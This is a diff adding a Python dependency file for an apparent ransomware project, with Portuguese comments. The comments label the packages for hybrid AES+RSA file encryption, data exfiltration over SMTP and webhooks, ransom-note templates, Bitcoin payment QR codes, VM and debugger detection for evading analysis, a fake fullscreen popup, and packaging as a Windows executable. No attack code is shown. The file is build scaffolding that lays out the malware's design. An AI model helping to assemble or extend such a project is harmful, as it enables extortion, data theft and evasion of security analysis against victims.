@@ -1,0 +1,32 @@
+# 🔐 Criptografia Híbrida AES + RSA
+pycryptodome==3.20.0
+
+# 📤 Exfiltração
+requests==2.31.0
+retrying==1.3.4           # Retry SMTP/Webhook (mantém compatibilidade)
+
+# 📧 Email via SMTP
+email-validator==2.1.0    # (opcional para validar email)
+
+# 📄 Templates dinâmicos da nota de resgate
+jinja2==3.1.3
+
+# 📸 QR Code BTC
+qrcode==7.4.2
+pillow==10.2.0            # Necessário para renderizar QR
+
+# 🧠 Detecção de VM e Debuggers
+psutil==5.9.8
+getmac==0.9.3
+pywin32==306              # Suporte a Registro e APIs Windows
+
+# 🪟 Fullscreen Fake HUD (popup)
+pygetwindow==0.0.9        # Alternativa para Tkinter fullscreen
+
+# 🛠 Utilitários
+pyinstaller==6.4.0        # (caso queira empacotar .exe no final)
+colorama==0.4.6           # Cores no terminal
+rich==13.7.0              # Logs visuais / debug bonitos (opcional)
+
+# 📦 Compatibilidade extra (Windows, Unicode)
+charset-normalizer==3.3.2
